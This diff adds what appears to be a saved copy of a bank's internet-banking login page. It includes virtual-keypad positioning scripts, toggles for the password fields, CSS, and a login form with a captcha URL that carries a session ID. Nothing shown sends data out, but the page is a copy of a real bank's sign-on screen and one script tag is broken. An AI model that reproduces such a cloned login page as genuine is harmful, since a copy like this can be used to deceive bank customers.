+                    };
+
+
+                    setStyle = function(obj, style, value) {
+                        obj.style[style] = value;
+                    };
+
+
+                    enableTextField = function(whatelement) {
+                        this.target.disabled = false;
+                    };
+
+                    getPixel = function(str) {
+                        if (str == "") {
+                            return "0";
+                        } else {
+                            return parseInt(str.substring(0, str.length - 2), 10);
+                        }
+                    };
+
+
+                    randomDisplay = function() {
+
+                        var scrollTop = window.pageYOffset || window.document.documentElement.scrollTop || window.document.body.scrollTop;
+                        var maxtop = scrollTop + 320;
+                        var maxleft = 320;
+                        var pos = Math.random() * 200;
+                        var locationtop;
+                        var locationleft;
+
+                        if (!isIE) {
+                            locationtop = getPixel(document.getElementById('pp_div').style.top);
+                            locationleft = getPixel(document.getElementById('pp_div').style.left);
+                        } else {
+                            locationtop = document.all.pp_div.style.pixelTop;
+                            locationleft = document.all.pp_div.style.pixelLeft;
+                        }
+
+                        if (pos <= 150)
+                            locationtop = locationtop + pos;
+                        else
+                            locationtop = locationtop - pos;
+
+                        if (locationleft <= 200)
+                            locationleft = locationleft + pos;
+                        else
+                            locationleft = locationleft - pos;
+
+                        if (locationtop < scrollTop)
+                            locationtop = scrollTop;
+                        else if (locationtop > maxtop)
+                            locationtop = maxtop;
+
+                        if (locationleft < 0)
+                            locationleft = 1;
+                        else if (locationleft >= maxleft)
+                            locationleft = maxleft;
+                        if (!isIE) {
+                            document.getElementById('pp_div').style.top = locationtop + 'px';
+                            document.getElementById('pp_div').style.left = locationleft + 'px';
+                        } else {
+                            document.all.pp_div.style.pixelTop = locationtop;
+                            document.all.pp_div.style.pixelLeft = locationleft;
+                        }
+                        display();
+                    };
+
+
+
+
+                    fixedDisplay = function(element) {
+                        /* Changes done for 11.0.8 Enhancement
+                        Virtual Keyboard will be displayed at right hand side of Virtual Keypad image */
+                        console.log("Phantom 1");
+                        /* Fetch element which has focus */
+                        var windowWidth = jQuery(window).width();
+                        var whatelement = "";
+
+                        whatelement = document.getElementById(element);
+
+                        /* Fetch postition of element */
+                        var leftPosition = whatelement.offsetLeft;
+                        var topPosition = jQuery(whatelement).offset().top;
+                        var elementWidth = whatelement.offsetWidth;
+                        var elementHeight = document.getElementById('pp_div').offsetHeight;
+
+                        console.log("Phantom 3");
+                        var leftBuffer = 0;
+                        var heightBuffer = 0;
+                        var grouplettBuffer = 0;
+                        var leftPosTotal = 0;
+                        var topPosTotal = 0;
+                        var isRTL = "N";
+                        if (jQuery('html') && jQuery('html').css('direction') && jQuery('html').css('direction') == "rtl") {
+                            isRTL = "Y";
+                        }
+                        if (parseInt(windowWidth) >= 900) {
+                            leftBuffer = 110;
+                            heightBuffer = 150;
+                            grouplettBuffer = 70;
+                        } else if (parseInt(windowWidth) < 900 && parseInt(windowWidth) >= 800) {
+                            leftBuffer = 200;
+                            heightBuffer = 150;
+                            grouplettBuffer = 20;
+                        } else if (parseInt(windowWidth) < 800 && parseInt(windowWidth) >= 640) {
+                            leftBuffer = 270;
+                            heightBuffer = 150;
+                            grouplettBuffer = 20;
+                        } else {
+                            leftBuffer = 300;
+                            heightBuffer = 150;
+                            grouplettBuffer = 10;
+                        }
+                        //Added for ticket 734570
+                        if (jQuery('#isRMLoginPage').length != 0 && typeof jQuery('#isRMLoginPage') != "undefined") {
+                            var isRMLogin = jQuery('#isRMLoginPage').val();
+                            if (isRMLogin === "Y") {
+                                console.log("RM Authentication page ");
+                                leftBuffer = 0;
+                                heightBuffer = 0;
+                                grouplettBuffer = 20;
+                            }
+                        }
+                        console.log("Phantom 4");
+
+                        if (isRTL == "Y") {
+                            leftPosTotal = leftPosition - elementWidth - leftBuffer;
+                        } else {
+                            leftPosTotal = leftPosition + elementWidth - leftBuffer;
+                        }
+                        topPosTotal = topPosition - elementHeight - heightBuffer;
+
+                        var leftPosPercent = (parseInt(leftPosTotal) / parseInt(windowWidth)) * 100;
+
+                        console.log("Phantom 5");
+                        if (onFocus == 'Y' || jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                            document.getElementById('pp_div').style.top = topPosTotal + 'px';
+                        } else {
+                            document.getElementById('pp_div').style.top = topPosTotal - 50 + 'px';
+                        }
+                        if (jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                            if (parseInt(windowWidth) >= 900) {
+                                document.getElementById('pp_div').style.left = leftPosPercent + 25 + '%';
+                            } else {
+                                document.getElementById('pp_div').style.left = leftPosPercent + 82 + '%';
+                            }
+                        } else {
+                            document.getElementById('pp_div').style.left = leftPosPercent + '%';
+                        }
+                        if (isRTL == "Y") {
+                            document.getElementById('pp_div').style.right = 'auto';
+                        }
+                        console.log("Phantom 6");
+                        display();
+                    };
+
+
+                    fixedDisplayBelow = function(element) {
+                        console.log("inside fixed display below" + element + "aaaa");
+                        /* Changes done for 11.0.8 Enhancement
+                        Virtual Keyboard will be displayed below */
+
+                        var windowWidth = jQuery(window).width();
+                        var elementName = 'null';
+
+                        if (elementName != 'null')
+                            elementName = elementName + ':' + element;
+                        else
+                            elementName = element;
+
+                        /* Fetch element which has focus */
+                        currentID = element;
+                        var whatelement = document.getElementById(elementName);
+
+                        /* Fetch postition of element */
+                        var leftPosition = whatelement.offsetLeft;
+                        var topPosition = whatelement.offsetTop;
+                        var elementWidth = whatelement.offsetWidth;
+                        var elementHeight = document.getElementById('pp_div').offsetHeight;
+
+                        var leftBuffer = 0;
+                        var heightBuffer = 0;
+
+                        if (parseInt(windowWidth) >= 900) {
+                            leftBuffer = 60;
+                            heightBuffer = (elementHeight / 2) + 36;
+                        } else if (parseInt(windowWidth) < 900 && parseInt(windowWidth) >= 800) {
+                            leftBuffer = 100;
+                            if (onFocus == 'Y') {
+                                heightBuffer = elementHeight;
+                            } else {
+                                heightBuffer = elementHeight + 5;
+                            }
+                        } else if (parseInt(windowWidth) < 800 && parseInt(windowWidth) >= 640) {
+                            leftBuffer = 180;
+                            if (onFocus == 'Y') {
+                                heightBuffer = elementHeight;
+                            } else {
+                                heightBuffer = elementHeight + 5;
+                            }
+                        } else {
+                            leftBuffer = elementWidth;
+                            if (onFocus == 'Y') {
+                                heightBuffer = elementHeight + 20;
+                            } else {
+                                heightBuffer = elementHeight + 25;
+                            }
+                        }
+
+                        var leftPosTotal;
+                        if (jQuery('.next-genHeader').length > 0) {
+                            leftPosTotal = leftPosition - leftBuffer;
+                        } else {
+                            leftPosTotal = leftPosition + elementWidth - leftBuffer;
+                        }
+                        var leftPosPercent = (parseInt(leftPosTotal) / parseInt(windowWidth)) * 100;
+                        if (onFocus == 'Y') {
+                            //document.getElementById('pp_div').style.top=  topPosition + (elementHeight/2) + 10 +'px';                                    	
+                            if (jQuery('.next-genHeader').length > 0) {
+                                heightBuffer = -220;
+                                document.getElementById('pp_div').style.top = topPosition + heightBuffer + 'px';
+                            } else {
+                                document.getElementById('pp_div').style.top = topPosition + heightBuffer + 'px';
+                            }
+
+                        } else {
+                            //document.getElementById('pp_div').style.top=  topPosition + (elementHeight/2) + 15 +'px';                                    	
+                            if (jQuery('.next-genHeader').length > 0) {
+                                heightBuffer = -220;
+                                document.getElementById('pp_div').style.top = topPosition + heightBuffer + 'px';
+                            } else {
+                                document.getElementById('pp_div').style.top = topPosition + heightBuffer + 'px';
+                            }
+                        }
+                        //document.getElementById('pp_div').style.left= leftPosition + elementWidth - 100 + 'px';
+                        document.getElementById('pp_div').style.left = leftPosPercent + '%';
+                        display();
+                    };
+
+
+
+                    fixedDisplayAbove = function(element) {
+                        console.log("inside fixed display above" + element + "aaaa");
+
+                        var windowWidth = jQuery(window).width();
+                        /* Fetch element which has focus */
+                        currentID = element;
+                        var elementName = 'null';
+
+                        if (elementName != 'null')
+                            elementName = elementName + ':' + element;
+                        else
+                            elementName = element;
+
+                        var whatelement = document.getElementById(elementName);
+
+                        /* Fetch postition of element */
+                        var leftPosition = whatelement.offsetLeft;
+                        var topPosition = whatelement.offsetTop;
+                        var elementWidth = whatelement.offsetWidth;
+                        var elementHeight = document.getElementById('pp_div').offsetHeight;
+
+                        var leftBuffer = 0;
+                        var heightBuffer = 0;
+
+                        if (parseInt(windowWidth) > 900) {
+                            leftBuffer = 10;
+                            heightBuffer = -220;
+                        } else if (parseInt(windowWidth) <= 900 && parseInt(windowWidth) >= 800) {
+                            if (jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                                leftBuffer = 150;
+                            } else {
+                                leftBuffer = 110;
+                            }
+                            heightBuffer = -220;
+                        } else if (parseInt(windowWidth) < 800 && parseInt(windowWidth) >= 640) {
+                            if (jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                                leftBuffer = 210;
+                            } else {
+                                leftBuffer = 110;
+                            }
+                            heightBuffer = -220;
+                        } else {
+                            if (jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                                leftBuffer = 180;
+                            } else {
+                                leftBuffer = 70;
+                            }
+                            heightBuffer = -220;
+                        }
+                        var leftPosTotal;
+                        leftPosTotal = leftPosition + elementWidth - leftBuffer;
+                        var leftPosPercent = (parseInt(leftPosTotal) / parseInt(windowWidth)) * 100;
+                        document.getElementById('pp_div').style.top = topPosition + heightBuffer + 'px';
+                        document.getElementById('pp_div').style.left = leftPosPercent + '%';
+                        display();
+                    };
+
+
+
+
+
+
+                    closeKeypad = function() {
+                        jQuery(document.getElementById('pp_div')).hide();
+                        if (jQuery('#MODAL_VIEW_CONTAINER').length > 0) {
+                            jQuery(document.getElementById('pp_div')).css('visibility', 'hidden');
+                        }
+                    }
+
+                    ddN4 = function(whatLayer) {
+
+                        if (!isN4) return;
+                        N4 = eval(whatLayer);
+                        N4.captureEvents(Event.MOUSEDOWN | Event.MOUSEUP);
+                        N4.onmousedown = function(ctl) {
+
+                            N4.captureEvents(Event.MOUSEMOVE);
+                            N4x = ctl.x;
+                            N4y = ctl.y;
+                        }
+                        N4.onmousemove = function(ctl) {
+
+                            if (isHot) {
+
+                                N4.moveBy(ctl.x - N4x, ctl.y - N4y);
+                                return false;
+                            }
+                        }
+                        N4.onmouseup = function() {
+
+                            N4.releaseEvents(Event.MOUSEMOVE);
+                        }
+                    };
+
+
+                    donePinPad = function(buffer) {
+                        this.target.value = buffer.value;
+                        buffer.value = '';
+
+                    };
+
+                    openPinPadHelp = function() {
+
+                        var url = 'pinpad.html';
+                        newwindow = window.open(url, 'Security', 'height=500,width=700,scrollbars=yes,resizable=yes');
+                        if (window.focus) {
+
+                            newwindow.focus();
+                        }
+                    };
+
+                    display = function() {
+                        if (navigator.userAgent.toLowerCase().indexOf("msie") != -1) {
+                            if (document.getElementById('iframetop') != null) {
+
+
+                                var layerdiv = document.getElementById('pp_div');
+                                layerdiv.style.display = '';
+
+                                var iframe = document.getElementById('iframetop');
+                                iframe.style.display = '';
+                                iframe.style.width = layerdiv.offsetWidth;
+                                iframe.style.height = layerdiv.offsetHeight;
+                                iframe.style.left = layerdiv.offsetLeft;
+                                iframe.style.top = layerdiv.offsetTop;
+                                iframe.style.visibility = layerdiv.style.visibility;
+                            }
+                        }
+                    };
+                    setValues = function(strengthImage, strengthValue) {
+                        pwdImageValue = strengthImage;
+                        pwdStrengthValue = strengthValue;
+
+                    };
+
+                    function getScrollXY() {
+                        var scrOfX = 0,
+                            scrOfY = 0;
+                        if (typeof(window.pageYOffset) == 'number') {
+
+                            scrOfY = window.pageYOffset;
+                            scrOfX = window.pageXOffset;
+                        } else if (document.body && (document.body.scrollLeft || document.body.scrollTop)) {
+
+                            scrOfY = document.body.scrollTop;
+                            scrOfX = document.body.scrollLeft;
+                        } else if (document.documentElement && (document.documentElement.scrollLeft || document.documentElement.scrollTop)) {
+
+                            scrOfY = document.documentElement.scrollTop;
+                            scrOfX = document.documentElement.scrollLeft;
+                        }
+                        return [scrOfX, scrOfY];
+                    }
+
+                    console.log("at the end of working js");
+                </script>
+
+
+
+                <script type="text/javascript">
+                    console.log("after not working js");
+                    document.onmousedown = ddInit;
+                    document.onmouseup = Function("ddEnabled=false");
+                </script>
+                <iframe id="iframetop" scrolling="no" frameborder="0"> </iframe>
+                <div id="pp_div" valign="right" class="keypaddiv">
+                    <div id="scriptdiv"></div>
+                </div>
+
+                <script type="text/javascript">
+                    ppX = 100;
+                    ppY = 100;
+                    setTimeout('setPinPadCtl(null)', 1);
+                </script>
+
+
+                <Script type="text/javascript">
+                    function textboxenabling(whatobject, whatimage, whatelement)
+
+                    {
+
+                        var elememtId = document.getElementById(whatelement);
+
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard");
+
+
+                        if (onFocus == 'Y' && !e1.checked) {
+
+                            elememtId.disabled = true;
+
+                            elememtId.disabled = false;
+
+                            elememtId.readOnly = true;
+                            // alert('checking'+onFocus+e1);
+                            settingPinPadCtlOnFocus(whatobject, whatimage, whatelement);
+
+                        } else {
+
+                            elememtId.disabled = false;
+
+                            elememtId.readOnly = false;
+
+                        }
+
+
+
+                    };
+                </script>
+
+                <script>
+                    function textboxenabling1(whatobject, whatimage, whatelement)
+
+                    {
+
+
+                        var elememtId1 = document.getElementById(whatelement);
+
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard");
+
+                        if (onUserIdFocus == 'Y' && !e1.checked) {
+
+                            elememtId1.disabled = true;
+
+                            elememtId1.disabled = false;
+
+                            elememtId1.readOnly = true;
+
+                            settingPinPadCtlOnFocus(whatobject, whatimage, whatelement);
+
+                        } else {
+
+                            elememtId1.disabled = false;
+
+                            elememtId1.readOnly = false;
+
+                        }
+
+
+
+                    };
+                </script>
+
+                <Script type="text/javascript">
+                    function disablePasswordKeyboard()
+
+                    {
+
+                        var e2 = document.getElementById("Disable_Virtual_keyBoard2");
+
+                        var ex2 = document.getElementById("AuthenticationFG.ACCESS_CODE");
+
+                        if (e2.checked) {
+
+                            ex2.disabled = false;
+
+                            ex2.readOnly = false;
+
+                            onFocus = 'N';
+
+                            hidingkeypad = 1;
+
+                            closeKeypad();
+
+                            setPinPadCtl(null);
+
+                        } else {
+
+                            ex2.readOnly = true;
+
+                            onFocus = 'Y';
+
+                            hidingkeypad = 0;
+
+                        }
+
+                    };
+                </script>
+
+                <script>
+                    function disableUserIdKeyboard()
+
+                    {
+
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard1");
+
+                        var ex1 = document.getElementById("AuthenticationFG.USER_PRINCIPAL");
+
+                        if (e1.checked) {
+
+                            ex1.disabled = false;
+
+                            ex1.readOnly = false;
+
+                            onUserIdFocus = 'N';
+
+                            hidinguserIdkeypad = 1;
+
+                            closeKeypad();
+
+                            setPinPadCtl(null);
+
+                        } else {
+
+                            ex1.readOnly = true;
+
+                            onUserIdFocus = 'Y';
+
+                            hidinguserIdkeypad = 0;
+
+                        }
+
+                    };
+                </script>
+
+                <script>
+                    function disableKeyboard()
+
+                    {
+
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard");
+                        var ex2 = document.getElementById("AuthenticationFG.ACCESS_CODE");
+
+
+                        if (e1.checked) {
+
+                            /*alert("heyliyo if");*/
+                            ex2.disabled = false;
+
+                            ex2.readOnly = false;
+
+                            onUserIdFocus = 'N';
+
+                            onFocus = 'N';
+
+                            hidinguserIdkeypad = 1;
+
+                            hidingkeypad = 1;
+
+                            closeKeypad();
+
+                            setPinPadCtl(null);
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+
+
+                        } else {
+                            /*alert("heyliyo else"); */
+                            onUserIdFocus = 'Y';
+                            onFocus = 'Y';
+                            hidinguserIdkeypad = 0;
+
+                            hidingkeypad = 0;
+                            ex2.readOnly = true;
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                        }
+
+                    };
+                </script>
+
+
+                <script>
+                    function disablePasswordField()
+
+                    {
+
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard");
+
+                        var ex1 = document.getElementById("LoginAltFlowFG.LOGIN_PWD");
+
+                        var ex2 = document.getElementById("LoginAltFlowFG.RETYPE_LOGIN_PWD");
+
+                        if (e1.checked) {
+
+                            ex1.disabled = false;
+
+                            ex1.readOnly = false;
+
+                            ex2.disabled = false;
+
+                            ex2.readOnly = false;
+
+                            onUserIdFocus = 'N';
+
+                            onFocus = 'N';
+
+                            hidinguserIdkeypad = 1;
+
+                            hidingkeypad = 1;
+
+                            closeKeypad();
+
+                            setPinPadCtl(null);
+
+                        } else {
+
+                            ex1.readOnly = true;
+
+                            onUserIdFocus = 'Y';
+
+                            onFocus = 'Y';
+
+                            hidinguserIdkeypad = 0;
+
+                            hidingkeypad = 0;
+
+                        }
+
+                    };
+                </script>
+
+                <script>
+                    function disableKeyboardAdmin()
+
+                    {
+
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard");
+                        var ex2 = document.getElementById("RMAuthenticationFG.ACCESS_CODE");
+
+
+                        if (e1.checked) {
+
+
+
+                            ex2.disabled = false;
+
+                            ex2.readOnly = false;
+
+                            onUserIdFocus = 'N';
+
+                            onFocus = 'N';
+
+                            hidinguserIdkeypad = 1;
+
+                            hidingkeypad = 1;
+
+                            closeKeypad();
+
+                            setPinPadCtl(null);
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+
+
+                        } else {
+
+
+
+                            onUserIdFocus = 'Y';
+                            onFocus = 'Y';
+                            hidinguserIdkeypad = 0;
+
+                            hidingkeypad = 0;
+                            ex2.readOnly = true;
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                        }
+
+                    };
+                </script>
+
+                <script>
+                    function disableKeyboardPassword()
+
+                    {
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard");
+                        var ex2 = document.getElementById("AuthenticationFG.SIGNON_PWD");
+                        var ex3 = document.getElementById("AuthenticationFG.SIGNON_NEW_PWD");
+                        var ex4 = document.getElementById("AuthenticationFG.RETYPE_SIGNON_PWD");
+
+                        if (e1.checked) {
+
+                            ex2.disabled = false;
+                            ex2.readOnly = false;
+                            ex3.disabled = false;
+                            ex3.readOnly = false;
+                            ex4.disabled = false;
+                            ex4.readOnly = false;
+
+                            onUserIdFocus = 'N';
+
+                            onFocus = 'N';
+
+                            hidinguserIdkeypad = 1;
+
+                            hidingkeypad = 1;
+
+                            closeKeypad();
+
+                            setPinPadCtl(null);
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+                            ex3.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+                            ex4.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+
+
+                        } else {
+                            onUserIdFocus = 'Y';
+                            onFocus = 'Y';
+                            hidinguserIdkeypad = 0;
+
+                            hidingkeypad = 0;
+                            ex2.readOnly = true;
+                            ex3.readOnly = true;
+                            ex4.readOnly = true;
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                            ex3.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                            ex4.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                        }
+
+                    };
+                </script>
+
+                <script>
+                    function disableKeyboardRMPassword()
+
+                    {
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard");
+                        var ex2 = document.getElementById("RMAuthenticationFG.SIGNON_PWD");
+                        var ex3 = document.getElementById("RMAuthenticationFG.SIGNON_NEW_PWD");
+                        var ex4 = document.getElementById("RMAuthenticationFG.RETYPE_SIGNON_PWD");
+
+                        if (e1.checked) {
+
+                            ex2.disabled = false;
+                            ex2.readOnly = false;
+                            ex3.disabled = false;
+                            ex3.readOnly = false;
+                            ex4.disabled = false;
+                            ex4.readOnly = false;
+
+                            onUserIdFocus = 'N';
+
+                            onFocus = 'N';
+
+                            hidinguserIdkeypad = 1;
+
+                            hidingkeypad = 1;
+
+                            closeKeypad();
+
+                            setPinPadCtl(null);
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+                            ex3.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+                            ex4.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+
+
+                        } else {
+                            onUserIdFocus = 'Y';
+                            onFocus = 'Y';
+                            hidinguserIdkeypad = 0;
+
+                            hidingkeypad = 0;
+                            ex2.readOnly = true;
+                            ex3.readOnly = true;
+                            ex4.readOnly = true;
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                            ex3.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                            ex4.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                        }
+
+                    };
+                </script>
+
+                <script>
+                    function disableKeyboardPasswordChange()
+
+                    {
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard");
+                        var ex2 = document.getElementById("PasswordChangeFG.SIGNON_PWD");
+                        var ex3 = document.getElementById("PasswordChangeFG.SIGNON_NEW_PWD");
+                        var ex4 = document.getElementById("PasswordChangeFG.RETYPE_SIGNON_PWD");
+
+                        if (e1.checked) {
+
+                            ex2.disabled = false;
+                            ex2.readOnly = false;
+                            ex3.disabled = false;
+                            ex3.readOnly = false;
+                            ex4.disabled = false;
+                            ex4.readOnly = false;
+
+                            onUserIdFocus = 'N';
+
+                            onFocus = 'N';
+
+                            hidinguserIdkeypad = 1;
+
+                            hidingkeypad = 1;
+
+                            closeKeypad();
+
+                            setPinPadCtl(null);
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+                            ex3.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+                            ex4.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+
+
+                        } else {
+                            onUserIdFocus = 'Y';
+                            onFocus = 'Y';
+                            hidinguserIdkeypad = 0;
+
+                            hidingkeypad = 0;
+                            ex2.readOnly = true;
+                            ex3.readOnly = true;
+                            ex4.readOnly = true;
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                            ex3.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                            ex4.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                        }
+
+                    };
+
+                    <
+                    /script
+
+
+                    function disableKeyboardAdminChange()
+
+                    {
+
+                        var e1 = document.getElementById("Disable_Virtual_keyBoard");
+                        var ex2 = document.getElementById("RMAuthenticationFG.ACCESS_CODE");
+                        var ex3 = document.getElementById("RMAuthenticationFG.VERIFICATION_CODE");
+
+
+                        if (e1.checked) {
+
+                            ex2.disabled = false;
+                            ex2.readOnly = false;
+                            ex3.disabled = false;
+                            ex3.readOnly = false;
+                            onUserIdFocus = 'N';
+
+                            onFocus = 'N';
+
+                            hidinguserIdkeypad = 1;
+
+                            hidingkeypad = 1;
+
+                            closeKeypad();
+
+                            setPinPadCtl(null);
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+                            ex3.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return true;
+                            }
+
+
+
+                        } else {
+                            onUserIdFocus = 'Y';
+                            onFocus = 'Y';
+                            hidinguserIdkeypad = 0;
+
+                            hidingkeypad = 0;
+                            ex2.readOnly = true;
+                            ex3.readOnly = true;
+
+
+                            ex2.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                            ex3.onkeydown = function() {
+                                var key = event.keyCode || event.charCode;
+                                if (key == 8)
+                                    return false;
+                            }
+                        }
+
+                    };
+                </script>
+
+
+
+
+                <style>
+                    .loginPage_dialog .ui-dialog-titlebar-close {
+                        display: none
+                    }
+
+                    .loginPage_dialog .ui-dialog-titlebar {
+                        display: none
+                    }
+
+                    .loginPage_dialog .ui-dialog-title {
+                        display: none
+                    }
+
+                    .loginPage_dialog {
+                        box-shadow: 0 0px;
+                        background: #000 !important;
+                        border-radius: 0px;
+                        border: 1px solid transparent;
+                        overflow: visible;
+                        padding: 20px;
+                        position: absolute;
+                        margin-left: 0px !important;
+                        margin-top: 35px;
+                        outline: none;
+                        opacity: .85;
+                        filter: Alpha(Opacity=85);
+                    }
+
+                    .infopopup {
+                        font-size: 13px;
+                        color: #FFFFFF;
+                    }
+
+                    .infopopup1 {
+                        font-size: 13px;
+                        color: #FFFFFF;
+                    }
+
+                    .infopopupSeperator {
+                        margin-top: 15px;
+                        width: 245px;
+                        height: 0px;
+                        display: inline-block;
+                        border: 1px solid #fff;
+                    }
+
+                    .infopopup_highlight {
+                        display: inline-block;
+                        font-weight: bold;
+                        font-size: 15px;
+                        color: #D2691E;
+                        margin: 15px 0 15px 0;
+                    }
+
+                    .ui-autocomplete {
+                        background: #FFFFFF !important;
+                        color: #FFFFFF;
+                        opacity: .99;
+                        cursor: default;
+                        position: absolute;
+                    }
+                </style>
+                <div id="dialog" title="The function for Remember User Id may not function if your cookies are disabled">
+                    <div class="arrow-up"></div>
+                    <p id="rememberContentTips1" style="display:none">
+                        <span class="infopopup1">The function for Remember User Id may not function if your cookies are disabled</span>
+                        <br><span class="infopopupSeperator"></span><br>
+                        <span class="infopopup_highlight">Security Tip</span><br>
+                        <span class="infopopup">When you save your user id, it is stored on the computer you are using; therefore you should never store your user id on a public computer.</span>
+                    </p>
+                </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                <div class="width100percent_main_loginbgCust" id="LoginHDisplay">
+
+
+                    <!--changes for UI -START-->
+                    <div class="skew-container-innerCust" id="LoginHDisplay.Rowset1">
+                        <div class="skew">
+
+                            <div class="skew-innerCust">
+                                <div class="skew-wrapCust">
+                                    <div class="inner-skew">
+
+                                        <form action="" method="">
+                                            <!-- <span class="ibanking">Log on to <strong>Internet Banking</strong><br><br></span> -->
+                                            <span class="ibanking">Log on to Internet Banking<br><br></span>
+                                            <div class="form-group">
+
+
+
+
+
+
+
+
+
+
+
+                                                <p id="LoginHDisplay.Ra10">
+                                                    <span id="LoginHDisplay.Ra10.C1"><label for="AuthenticationFG.USER_PRINCIPAL" id="UserId_Text"title = "User ID" >User ID<span class="redstar">*</span></label>
+                                                    </span><span id="LoginHDisplay.Ra10.C2"><span class="labelColumn"><input type="text" name = "AuthenticationFG.USER_PRINCIPAL" title = "User ID" size = "28"" class = "form-control type_UserPrincipal" data-febaType = "UserPrincipal"" maxLength = "65" id="AuthenticationFG.USER_PRINCIPAL" value="" title = "User ID"></span></span>
+                                                </p>
+
+                                                <span><small>For corporate customers, kindly use </small>Corporate ID.User ID</span>
+                                            </div>
+
+                                            <div class="form-group">
+
+                                                <i class="fa fa-repeat" aria-hidden="true"></i>
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                <p id="LoginHDisplay.Ra12">
+                                                    <span id="LoginHDisplay.Ra12.C1"><label for="AuthenticationFG.VERIFICATION_CODE" id="Verification"title = "Verification" >Verification<span class="redstar">*</span></label>
+                                                    </span><span id="LoginHDisplay.Ra12.C3" class="form-control"><input  type="Submit" name="Action.MIGRATED_USER" class="hideElement" id="VALIDATE_CREDENTIALS_DUMMY" value="."/><img src="AuthenticationController;jsessionid=0000Dt165hxHGXWptYzoErlMEdN:1b9vu7c1i?bwayparam=4GCtVsPqgPtwYGf4xVqvQ4o1nOb52UygqdLiozPPKUNnoKWlEknw8mTfe1d09p9leughvlSOWMZm%2FLv%2FjjHiKPyAyabuGg8je409HJo7%2F6k%3D" alt="Please Click On The Icon Next For Audio" id="IMAGECAPTCHA" /><input  type="Submit" name="Action.CHANGE_IMAGECAPTCHA" class="hideElement" id="CHANGE_IMAGECAPTCHA" value="."/></span></p>
+
+
+                                            </div>
+
+                                            <div class="form-group">
+
+
+
+
+
+
+
+
+                                                <p id="LoginHDisplay.Ra16">
+                                                    <span id="LoginHDisplay.Ra16.C2"><span class="labelColumn"><input type="text" name = "AuthenticationFG.VERIFICATION_CODE" title = "Verification Code"" class = "form-control type_FEBAUnboundString" data-febaType = "FEBAUnboundString"" maxLength = "" id="AuthenticationFG.VERIFICATION_CODE" value="" title = "Verification Code"></span></span>
+                                                </p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                            </div>
+
+
+
+                                            <div class="form-group">
+
+
+
+
+
+
+
+
+
+
+                                                <p id="LoginHDisplay.Ra18">
+                                                    <span id="LoginHDisplay.Ra18.C2"><input  type="Submit" name="Action.MIGRATED_USER" class="btn" id="MIGRATED_USER" value="Next" title = "Next"/></span></p>
+
+
+                                            </div>
+
+
+                                            <hr>
+
+                                            <div class="skew-customer">
+
+                                                <span>New customer ?<span>
+									<p><small><br>
+																		
+									
+										
+	
+										
+
+										
+
+										
+										
+										
+									<p  id="LoginHDisplay.Ra18" >
